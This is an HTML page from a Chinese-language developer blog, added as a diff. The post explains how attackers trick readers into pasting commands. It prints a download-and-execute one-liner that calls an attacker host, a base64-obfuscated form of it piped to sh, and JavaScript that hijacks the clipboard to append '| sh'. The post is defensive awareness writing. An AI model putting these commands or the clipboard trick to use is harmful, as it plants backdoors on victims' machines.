@@ -1,0 +1,301 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>從駭客角度告訴你為何不要隨意複製指令 | Yiyu&#39;s Dev Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta property="og:type" content="article">
+<meta property="og:title" content="從駭客角度告訴你為何不要隨意複製指令">
+<meta property="og:url" content="https://blog.yiyu0x.org/2020/03/16/index.html">
+<meta property="og:site_name" content="Yiyu&#39;s Dev Blog">
+<meta property="og:locale" content="zh_TW">
+<meta property="article:published_time" content="2020-03-16T03:13:36.000Z">
+<meta property="article:modified_time" content="2025-04-12T20:59:43.594Z">
+<meta property="article:author" content="yiyu0x">
+<meta property="article:tag" content="資訊安全">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/" title="Yiyu's Dev Blog">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Yiyu&#39;s Dev Blog</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">🏖️</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://blog.yiyu0x.org"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-從駭客角度告訴你為何不要隨意複製指令" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/03/16/" class="article-date">
+  <time class="dt-published" datetime="2020-03-16T03:13:36.000Z" itemprop="datePublished">2020-03-16</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      從駭客角度告訴你為何不要隨意複製指令
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <html><head></head><body><p>相信很多人都有這樣的經驗，下指令時產生某某錯誤。這個錯誤可能沒見過，也可能是之前遇過但是忘記怎麼解。但我們只要將錯誤複製起來，貼上搜尋引擎，馬上就會跳出各種網頁可以參考，無倫是知名的程式討論論壇，或著是官方文件，又或著是個人自行架設的部落格。看到指令就貼上這個習慣，是開發者的眾多壞習慣之一。</p>
+<p>駭客可以很巧妙的利用這一點，將精心製作的後門程式（或其他惡意程式），透過包裝，誘騙受害者（可能就是你）去執行。</p>
+<h2 id="生產惡意指令"><a href="#生產惡意指令" class="headerlink" title="生產惡意指令"></a>生產惡意指令</h2><p>假如今天我想要讓受害者的電腦執行一條指令就被植入後門，我會這麼做：</p>
+<p><code>curl https://evil.yiyu0x.site/evil --output evil --silent && chmod +x evil && ./evil && rm ./evil</code></p>
+<p>首先先透過 <code>curl</code> 下載遠端編譯好的惡意程式，並且給予該程式執行權限，然後執行，最後刪除（匿蹤）。</p>
+<p>但這種指令我想應該沒有人會直接貼上執行，不但意圖明顯，而且還直接告訴受害者：「我打算下載來路不名的檔案，而且要執行它」。</p>
+<h2 id="偽裝"><a href="#偽裝" class="headerlink" title="偽裝"></a>偽裝</h2><p>想要偽裝通常我們會將指令包裹成其他意圖，透過簡單的編碼來將這個惡意指令進行編碼，以下選用 base64 進行編碼：</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Y3VybCBodHRwczovL2V2aWwueWl5dTB4LnNpdGUvZXZpbCAtLW91dHB1dCBldmlsIC0tc2lsZW50ICYmIGNobW9kICt4IGV2aWwgJiYgLi9ldmlsICYmIHJtIC4vZXZpbA==</span><br></pre></td></tr></tbody></table></figure>
+
+<p>為何選擇使用 <code>base64</code>，原因是因為 Linux 內建就有 base64 工具，受害人可以透過執行 base64 解碼工具，解出具有意義的字串</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"Y3VybCBodHRwczovL2V2aWwueWl5dTB4LnNpdGUvZXZpbCAtLW91dHB1dCBldmlsIC0tc2lsZW50ICYmIGNobW9kICt4IGV2aWwgJiYgLi9ldmlsICYmIHJtIC4vZXZpbA=="</span> | base64 -d</span><br></pre></td></tr></tbody></table></figure>
+
+<p>output:</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://evil.yiyu0x.site/evil --output evil --silent && chmod +x evil && ./evil && rm ./evil</span><br></pre></td></tr></tbody></table></figure>
+
+<p>接著將字串 pipe 到 <code>sh</code> 就可以直接運行：</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"Y3VybCBodHRwczovL2V2aWwueWl5dTB4LnNpdGUvZXZpbCAtLW91dHB1dCBldmlsIC0tc2lsZW50ICYmIGNobW9kICt4IGV2aWwgJiYgLi9ldmlsICYmIHJtIC4vZXZpbA=="</span> | base64 -d | sh</span><br></pre></td></tr></tbody></table></figure>
+
+<p>以上指令就沒有辦法一眼就看出目的，但意圖不變。</p>
+<h2 id="進一步偽裝"><a href="#進一步偽裝" class="headerlink" title="進一步偽裝"></a>進一步偽裝</h2><p>有經驗的開發者看到指令中帶有 <code>sh</code> 就會馬上起疑心，這是一件好事。因為本來就不應該隨便下具有執行權限的指令，何況你根本不知道那串 <code>base64</code> 字串解出來為何。</p>
+<p>我們可以先將我們的惡意指令多新增一個功能，印出一些字串，讓受害者以為這串 <code>base64</code> 就是一個普通的字串而已：</p>
+<p><code>echo "Hi, Im yiyu0x :)" && curl https://evil.yiyu0x.site/evil --output evil --silent && chmod +x evil && ./evil && rm ./evil</code></p>
+<p>進行編碼：</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZWNobyAiSGksIEltIHlpeXUweCA6KSIgJiYgY3VybCBodHRwczovL2V2aWwueWl5dTB4LnNpdGUvZXZpbCAtLW91dHB1dCBldmlsIC0tc2lsZW50ICYmIGNobW9kICt4IGV2aWwgJiYgLi9ldmlsICYmIHJtIC4vZXZpbA==</span><br></pre></td></tr></tbody></table></figure>
+
+<p>惡意指令：</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"ZWNobyAiSGksIEltIHlpeXUweCA6KSIgJiYgY3VybCBodHRwczovL2V2aWwueWl5dTB4LnNpdGUvZXZpbCAtLW91dHB1dCBldmlsIC0tc2lsZW50ICYmIGNobW9kICt4IGV2aWwgJiYgLi9ldmlsICYmIHJtIC4vZXZpbA=="</span> | base64 -d | sh</span><br></pre></td></tr></tbody></table></figure>
+
+<p>執行後的結果：</p>
+<p><code>Hi, Im yiyu0x :)</code></p>
+<p>如果我將個指令放在一些顯眼的地方像是網站的自我介紹、說明欄，我相信有些具有好奇心的讀者可能就會傻傻執行。但是一些具有經驗的讀者還是會發現句尾帶的那個 <code>sh</code>，而不去執行它。</p>
+<p>那我如果改成這樣呢？</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"ZWNobyAiSGksIEltIHlpeXUweCA6KSIgJiYgY3VybCBodHRwczovL2V2aWwueWl5dTB4LnNpdGUvZXZpbCAtLW91dHB1dCBldmlsIC0tc2lsZW50ICYmIGNobW9kICt4IGV2aWwgJiYgLi9ldmlsICYmIHJtIC4vZXZpbA=="</span> | base64 -d</span><br></pre></td></tr></tbody></table></figure>
+
+<p>這樣子我相信 9 成以上的人（包含我自己），都會想把這段指令貼上去執行看一下結果為何，畢竟就是一條單純的解碼指令，怎麼可能有害？</p>
+<p>但是別忘了，惡意攻擊者可以在網頁中的 JS 插入：</p>
+<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> source = <span class="built_in">document</span>.querySelector(<span class="string">'div.source'</span>) <span class="comment">//指令區塊</span></span><br><span class="line">source.addEventListener(<span class="string">'copy'</span>, (event) => {</span><br><span class="line">    <span class="keyword">const</span> selection = <span class="built_in">document</span>.getSelection()</span><br><span class="line">    event.clipboardData.setData(<span class="string">'text/plain'</span>, selection.toString() + <span class="string">'| sh'</span>)</span><br><span class="line">    event.preventDefault()</span><br><span class="line">})</span><br></pre></td></tr></tbody></table></figure>
+
+<p>該程式碼的意思為當你複製字串時，自動將剪貼板中的字串末端加上 <code>| sh</code>，意思就是你複製到的字串其實是：</p>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"ZWNobyAiSGksIEltIHlpeXUweCA6KSIgJiYgY3VybCBodHRwczovL2V2aWwueWl5dTB4LnNpdGUvZXZpbCAtLW91dHB1dCBldmlsIC0tc2lsZW50ICYmIGNobW9kICt4IGV2aWwgJiYgLi9ldmlsICYmIHJtIC4vZXZpbA=="</span> | base64 -d | sh</span><br></pre></td></tr></tbody></table></figure>
+
+<p>如果你貼上 terminal 之後沒有檢查就直接按下 enter，那麼你的電腦就不知不覺的執行了一個執行檔而你完全沒有感覺。</p>
+<p>想想看，如果在開發者的部落格自我介紹，放入這種指令式的自我介紹是不是很有趣？或是放在臉書的自我介紹？當你很開心的貼上指令時，很可能默默中了人家的後門程式。</p>
+<h2 id="最後"><a href="#最後" class="headerlink" title="最後"></a>最後</h2><p>該文章的重點無非還是提醒幾點資安的意識：</p>
+<ul>
+<li>來路不明的指令不要貼上終端機執行</li>
+<li>不要相信剪貼板的內容，按下 Enter 執行前應該肉眼再度檢查一次指令</li>
+</ul>
+<p>最後提醒大家，在未經同意下入侵他人電腦是有刑責的，不要以身試法！</p>
+</body></html>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://blog.yiyu0x.org/2020/03/16/" data-id="cm9es89cn001ushrpbnoj7apj" data-title="從駭客角度告訴你為何不要隨意複製指令" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8/" rel="tag">資訊安全</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2020/04/29/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          眼見為憑？利用終端機特性藏匿惡意指令
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2020/02/15/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">重新看懂指標與陣列之間的交互關係</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/AWS/" rel="tag">AWS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CI-CD/" rel="tag">CI/CD</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DNS/" rel="tag">DNS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Docker/" rel="tag">Docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DroneCI/" rel="tag">DroneCI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/EKS/" rel="tag">EKS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ELB/" rel="tag">ELB</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Kubernetes/" rel="tag">Kubernetes</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/" rel="tag">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/c/" rel="tag">c</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cgroup/" rel="tag">cgroup</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/container/" rel="tag">container</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker/" rel="tag">docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/es6/" rel="tag">es6</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fp/" rel="tag">fp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/http2/" rel="tag">http2</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/javascript/" rel="tag">javascript</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kubernetes/" rel="tag">kubernetes</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/life/" rel="tag">life</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/" rel="tag">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/macOS/" rel="tag">macOS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/macos/" rel="tag">macos</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mysql/" rel="tag">mysql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nginx/" rel="tag">nginx</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nodejs/" rel="tag">nodejs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/oauth2/" rel="tag">oauth2</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/podman/" rel="tag">podman</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/raspberry-pi/" rel="tag">raspberry_pi</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shell/" rel="tag">shell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/socket/" rel="tag">socket</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/telegram/" rel="tag">telegram</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tools/" rel="tag">tools</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/traefik/" rel="tag">traefik</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%80%8B%E4%BA%BA/" rel="tag">個人</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8/" rel="tag">資訊安全</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/AWS/" style="font-size: 12.5px;">AWS</a> <a href="/tags/CI-CD/" style="font-size: 10px;">CI/CD</a> <a href="/tags/DNS/" style="font-size: 10px;">DNS</a> <a href="/tags/Docker/" style="font-size: 10px;">Docker</a> <a href="/tags/DroneCI/" style="font-size: 10px;">DroneCI</a> <a href="/tags/EKS/" style="font-size: 12.5px;">EKS</a> <a href="/tags/ELB/" style="font-size: 10px;">ELB</a> <a href="/tags/Kubernetes/" style="font-size: 15px;">Kubernetes</a> <a href="/tags/Linux/" style="font-size: 10px;">Linux</a> <a href="/tags/c/" style="font-size: 12.5px;">c</a> <a href="/tags/cgroup/" style="font-size: 10px;">cgroup</a> <a href="/tags/container/" style="font-size: 10px;">container</a> <a href="/tags/ctf/" style="font-size: 10px;">ctf</a> <a href="/tags/docker/" style="font-size: 17.5px;">docker</a> <a href="/tags/es6/" style="font-size: 15px;">es6</a> <a href="/tags/fp/" style="font-size: 10px;">fp</a> <a href="/tags/http2/" style="font-size: 10px;">http2</a> <a href="/tags/javascript/" style="font-size: 20px;">javascript</a> <a href="/tags/kubernetes/" style="font-size: 20px;">kubernetes</a> <a href="/tags/life/" style="font-size: 10px;">life</a> <a href="/tags/linux/" style="font-size: 12.5px;">linux</a> <a href="/tags/macOS/" style="font-size: 10px;">macOS</a> <a href="/tags/macos/" style="font-size: 15px;">macos</a> <a href="/tags/mysql/" style="font-size: 10px;">mysql</a> <a href="/tags/nginx/" style="font-size: 12.5px;">nginx</a> <a href="/tags/nodejs/" style="font-size: 12.5px;">nodejs</a> <a href="/tags/oauth2/" style="font-size: 10px;">oauth2</a> <a href="/tags/podman/" style="font-size: 10px;">podman</a> <a href="/tags/python/" style="font-size: 12.5px;">python</a> <a href="/tags/raspberry-pi/" style="font-size: 10px;">raspberry_pi</a> <a href="/tags/shell/" style="font-size: 10px;">shell</a> <a href="/tags/socket/" style="font-size: 10px;">socket</a> <a href="/tags/telegram/" style="font-size: 10px;">telegram</a> <a href="/tags/tools/" style="font-size: 12.5px;">tools</a> <a href="/tags/traefik/" style="font-size: 10px;">traefik</a> <a href="/tags/%E5%80%8B%E4%BA%BA/" style="font-size: 15px;">個人</a> <a href="/tags/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8/" style="font-size: 15px;">資訊安全</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/04/">四月 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/09/">九月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">八月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">七月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">十二月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">十一月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">五月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">四月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">三月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">一月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">八月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">七月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">四月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">三月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">二月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">一月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">十二月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">十一月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">十月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">九月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">八月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">七月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">六月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">五月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">三月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">二月 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2025/04/12/">test</a>
+          </li>
+        
+          <li>
+            <a href="/2025/04/12/">2025 Life Update</a>
+          </li>
+        
+          <li>
+            <a href="/2022/09/05/">EKS ELB 獲取 Client IP 方法紀錄</a>
+          </li>
+        
+          <li>
+            <a href="/2022/08/30/">建立 Reliable EKS 記錄</a>
+          </li>
+        
+          <li>
+            <a href="/2022/07/07/">在 macOS 上使用 Podman</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2025 yiyu0x<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
